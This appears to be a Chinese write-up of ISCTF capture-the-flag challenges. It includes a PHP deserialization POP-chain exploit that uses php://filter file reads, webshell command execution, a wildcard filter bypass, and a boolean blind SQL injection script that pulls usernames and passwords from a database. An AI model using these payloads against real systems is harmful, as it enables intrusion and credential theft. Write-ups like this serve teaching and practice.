# Web

## 圣杯战争

一道基础的反序列化题目，其实你通过读输出内容就知道pop链怎么来的

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);

class artifact{
    public $excalibuer;
    public $arrow;
    public function __toString(){
        echo "为Saber选择了对的武器!<br>";
        return $this->excalibuer->arrow;
    }
}

class prepare{
    public $release;
    public function __get($key){
        $functioin = $this->release;
        echo "蓄力!咖喱棒！！<br>";
        return $functioin();
    }
}
class saber{
    public $weapon;
    public function __invoke(){
        echo "胜利！<br>";
        include($this->weapon);
    }
}
class summon{
    public $Saber;
    public $Rider;

    public function __wakeup(){
        echo "开始召唤从者！<br>";
        echo $this->Saber;
    }
}

if(isset($_GET['payload'])){
    unserialize($_GET['payload']);
}
?> 
```

summon.Saber->artifact.excaliber->prepare.release->saber.weapon

```php
<?php
class artifact{
    public $excalibuer;
    public $arrow;
    public function __toString(){
        echo "为Saber选择了对的武器!<br>";
        return $this->excalibuer->arrow;
    }
}

class prepare{
    public $release;
    public function __get($key){
        $functioin = $this->release;
        echo "蓄力!咖喱棒！！<br>";
        return $functioin();
    }
}
class saber{
    public $weapon;
    public function __invoke(){
        echo "胜利！<br>";
        include($this->weapon);
    }
}
class summon{
    public $Saber;
    public $Rider;

    public function __wakeup(){
        echo "开始召唤从者！<br>";
        echo $this->Saber;
    }
} 
$a = new summon();
$a->Saber = new artifact();
$a->Saber->excalibuer = new prepare();
$a->Saber->excalibuer->release = new saber();
$a->Saber->excalibuer->release->weapon = 'php://filter/read=convert.base64-encode/resource=flag.php';
echo(serialize($a));
?>
```

得到flag

![image-20231122141420750](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231122141420750.png)

## where_is_the_flag 					

看起来像一句话木马的使用，先命令执行一下吧

system('ls')后有flag.php，cat后查看源代码

![image-20231123080941726](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123080941726.png)

ISCTF{10e1

查看根目录下的文件，有flag2

![image-20231123081043006](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123081043006.png)

05bf-8c3b-

用find命令查找了一下，发现并没有其他flag了，猜想是在phpinfo里

## 绕进你的心里 					



## wafr

一道纸老虎，由于没有过滤?和*，可以通过/bin来执行cat命令

![image-20231123084421322](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123084421322.png)

## easy_website 					

测试了一下，是sql注入，过滤方面，猜测是将or，select，union，空格替换为空（不区分大小写），用双写和/**/绕过，且有一个字段

![image-20231123085238474](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123085238474.png)

![image-20231123085409351](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123085409351.png)

![image-20231123085528797](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123085528797.png)

没有显示出database，且回显的只有成功或者语法错误，猜测是布尔盲注

先测试长度

```
admin'/**/anandd/**/(length(database()))>4;#
```

![image-20231123134540044](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123134540044.png)

输入5的时候会报错，因此database长度为5

然后就是经典的报错注入了

脚本在这

```python
import requests

url = 'http://43.249.195.138:22766/check.php'
results = ''
for i in range(80,130):
    right = 127
    left = 32
    mid = (right+left)/2
    while right > left:
        # payload = 'if(ascii(substr((database()),%d,1))>%d,1,0);#' %(i,mid)
        # payload = "1=if(ascii(substr((selselectect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema='users'),%i,1))>%d,1,0);#" %(i,mid)
        # payload = "1=if(ascii(substr((selselectect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='users'),%i,1))>%d,1,0);#" %(i,mid)
        payload = "1=if(ascii(substr((selselectect/**/group_concat(user,passwoorrd)/**/from/**/users.users),%i,1))>%d,1,0);#" %(i,mid)
        data = {
            "username" :  'admin\'/**/anandd/**/'+payload,
            "password" : '123',
        }
        # print(data)
        res = requests.post(url=url,data=data)
        if 'admin' in res.text:
            left = mid + 1
            # print(data)
        else:
            right = mid
        mid = int((right+left)/2)
    results += chr(mid)
    print(results)

# users
# users
# USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,user,password
# USER admin,guest,flag
#

```

这里看到列中有许多数据，应该是先看USER再看user和password

## 1z_Ssql 				

看起来是道sql注入

先测试有没有过滤，后面发现过滤了union，=，sys,information,where,innodb

万能密码admin' or 1>0#测试了一下，发现有一串base64编码

![image-20231123172944750](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123172944750.png)

】结果啥都不是。。。。。

尝试用order by测字段，发现字段为3

试试能不能用dirsearch扫出什么

![image-20231123173047595](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123173047595.png)

有一个robots.txt，发现是waf

![image-20231123173122444](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231123173122444.png)

base64解码后是个乱码

# 签到

题目方法有很多，只要把二维码拼起来就行，我这里用了wps的拼图功能，当然了，手机这些的或者ps这些的都可以

# Crypto

## easy_rsa

```python
from Crypto.Util.number import *
import gmpy2



e=65537

n = p*q
phi = (p-1)*(q-1)
d = gmpy2.invert(e,phi)
str = pow(c,d,n)
print(long_to_bytes(str))
#flag=b'ISCTF{b7357bec-69ce-4d43-8523-9cd08662c5bd}'
```
